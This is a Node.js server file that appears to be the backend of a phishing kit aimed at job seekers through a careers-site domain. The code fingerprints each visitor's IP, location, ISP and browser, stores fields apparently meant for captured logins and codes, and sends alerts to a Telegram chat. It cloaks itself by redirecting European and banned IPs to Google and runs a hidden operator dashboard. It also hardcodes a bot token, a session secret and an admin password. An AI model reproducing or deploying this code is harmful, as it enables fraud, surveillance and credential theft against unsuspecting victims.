const express = require('express');
const session = require('express-session');
const basicAuth = require('basic-auth');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const UAParser = require('ua-parser-js');
const axios = require('axios');
const fs = require('fs');
const geoip = require('geoip-lite');
const TelegramBot = require('node-telegram-bot-api');

// 🔹 Telegram Setup
const TELEGRAM_TOKEN = '8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus';
const CHAT_ID = '-1003130451792'; // ✅ Replace with your group/channel ID

const APP_URL = process.env.RENDER_EXTERNAL_URL || 'https://jobback-qp48.onrender.com';
const WEBHOOK_PATH = `/bot${TELEGRAM_TOKEN}`;
const WEBHOOK_URL = `${APP_URL}${WEBHOOK_PATH}`;

// 🔹 Create Express + HTTP server
const app = express();
const server = http.createServer(app);

// 🔹 Initialize Telegram Bot with webhook
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

bot.setWebHook(WEBHOOK_URL)
  .then(() => console.log(`✅ Webhook set to: ${WEBHOOK_URL}`))
  .catch(err => console.error('❌ Failed to set webhook:', err.message));

// Telegram Webhook Endpoint
app.use(express.json());
app.post(WEBHOOK_PATH, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ✅ Helper to send messages
async function sendTelegramMessage(text) {
  try {
    await bot.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });
    console.log('📩 Telegram message sent');
  } catch (err) {
    console.error('❌ Telegram send failed:', err.message);
  }
}

// 🔹 Session + Middleware
app.use(session({
  secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true, sameSite: 'none', maxAge: 24 * 60 * 60 * 1000 }
}));
app.use(cors({ origin: ['https://aquentcareers.io'], methods: ['GET', 'POST'] }));
app.use(express.json());

// 🔹 Auth Middleware
function auth(req, res, next) {
  if (req.session && req.session.authenticated) return next();
  const user = basicAuth(req);
  const username = 'ttwstt';
  const password = 'Neo.123!@#';
  if (user && user.name === username && user.pass === password) {
    req.session.authenticated = true;
    return next();
  }
  res.set('WWW-Authenticate', 'Basic realm="Restricted Area"');
  return res.status(401).send('Authentication required.');
}

// 🔹 Static Admin Panel
const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
app.use('/dash', auth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
app.use('/public', express.static(path.join(__dirname, 'public')));

// 🔹 Socket.io setup
const io = socketIo(server, {
  cors: { origin: ['https://aquentcareers.io'], methods: ['GET', 'POST'] }
});

const users = {};
const userData = {};
const socketToClient = {};
const newUsers = new Set();

// 🔹 Format date
function formatDateTime(date) {
  return {
    full: date.toISOString(),
    date: date.toLocaleDateString(),
    time: date.toLocaleTimeString(),
    timestamp: Date.now()
  };
}

// 🔹 Check banned IP
function isBanned(ip) {
  try {
    const bannedIps = fs.readFileSync(BAN_LIST_FILE, 'utf8').split('\n');
    return bannedIps.includes(ip.trim());
  } catch {
    return false;
  }
}

// 🔹 Ban IP
function banIp(ip) {
  const cleanIp = ip.trim();
  if (!isBanned(cleanIp)) {
    try {
      if (fs.existsSync(BAN_LIST_FILE)) {
        const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');
        if (!data.endsWith('\n')) fs.appendFileSync(BAN_LIST_FILE, '\n');
      }
      fs.appendFileSync(BAN_LIST_FILE, `${cleanIp}\n`);
      console.log(`🚫 IP Banned: ${cleanIp}`);
    } catch (err) {
      console.error('Error saving banned IP:', err);
    }
  }
}

// 🔹 Update Panel Users
function updatePanelUsers() {
  const data = Object.values(userData)
    .filter(user => user?.time?.timestamp && Date.now() - user.time.timestamp <= 2 * 60 * 60 * 1000)
    .sort((a, b) => b.time.timestamp - a.time.timestamp);
  io.of('/panel').emit('update-users', { users: data, newUsers: Array.from(newUsers) });
}

// 🔹 Handle Socket Connections
io.on('connection', async (socket) => {
  const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
  const userAgent = socket.handshake.headers['user-agent'];
  const timestamp = formatDateTime(new Date());

  const geo = geoip.lookup(clientIP);
  const isEuropean = geo && geo.country && ['AL','AD','AT','BE','BA','BG','BY','CH','CY','CZ','DE','DK','EE','ES','FI','FR','GB','GR','HR','HU','IE','IS','IT','LT','LU','LV','MC','MD','ME','MK','MT','NL','NO','PL','PT','RO','RS','RU','SE','SI','SK','SM','UA','VA'].includes(geo.country);

  // Block banned or EU users
  if (isBanned(clientIP) || isEuropean) {
    socket.emit('redirect', 'https://www.google.com/');
    socket.disconnect();
    return;
  }

  let clientId = socket.handshake.query.clientId;
  if (!clientId || typeof clientId !== 'string') {
    clientId = crypto.randomBytes(16).toString('hex');
    socket.emit('assign-client-id', clientId);
  }

  socketToClient[socket.id] = clientId;
  users[socket.id] = socket;

  const parser = new UAParser(userAgent);
  const browserName = parser.getBrowser().name || 'Unknown';

  let city = 'Unknown', country = 'Unknown', isp = 'Unknown';
  try {
    const res = await axios.get(`http://ip-api.com/json/${clientIP}`);
    if (res.data && res.data.status === 'success') {
      city = res.data.city || 'Unknown';
      country = res.data.country || 'Unknown';
      isp = res.data.isp || 'Unknown';
    }
  } catch (err) {
    console.error('GeoIP lookup failed:', err.message);
  }

  let connectionHandled = false;

  const connectionTimeout = setTimeout(() => {
    if (!connectionHandled) {
      const isNewUser = !userData[clientId];
      userData[clientId] = {
        ...(userData[clientId] || {}),
        id: clientId,
        ip: clientIP,
        userAgent,
        time: timestamp,
        isConnected: true,
        login: userData[clientId]?.login || {},
        codes: userData[clientId]?.codes || [],
        action: null
      };

      if (isNewUser) {
        newUsers.add(clientId);
        const msg =
          `🌟 *New Connection Established*\n\n` +
          `🆔 *Client ID:* \`${clientId}\`\n` +
          `🌍 *IP Address:* \`${clientIP}\`\n` +
          `🏙 *City:* \`${city}\`\n` +
          `🏳️ *Country:* \`${country}\`\n` +
          `🌐 *Browser:* \`${browserName}\`\n` +
          `🛣 *Provider:* \`${isp}\`\n\n` +
          `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\``;
        sendTelegramMessage(msg);
      }
      updatePanelUsers();
    }
  }, 3000);

  socket.on('userConnectedToPage', (data) => {
    connectionHandled = true;
    clearTimeout(connectionTimeout);
    const cid = data.clientId || socket.id;
    socketToClient[socket.id] = cid;
    if (!userData[cid]) {
      userData[cid] = {
        id: cid,
        ip: clientIP,
        userAgent,
        time: timestamp,
        isConnected: true,
        login: {},
        codes: [],
        action: data.page || null
      };
    } else {
      userData[cid].action = data.page;
    }
    const pageMsg = `🌐 *User Connected to Page*\n\n📄 *Page:* \`${data.page}\`\n📱 *cid:* \`${cid}\``;
    sendTelegramMessage(pageMsg);
    updatePanelUsers();
  });

  socket.on('disconnect', () => {
    const cid = socketToClient[socket.id];
    if (cid && userData[cid]) userData[cid].isConnected = false;
    delete users[socket.id];
    delete socketToClient[socket.id];
    newUsers.delete(clientId);
    updatePanelUsers();
  });
});

// 🔹 Start Server
server.listen(3001, () => console.log('✅ Server running on http://localhost:3001'));
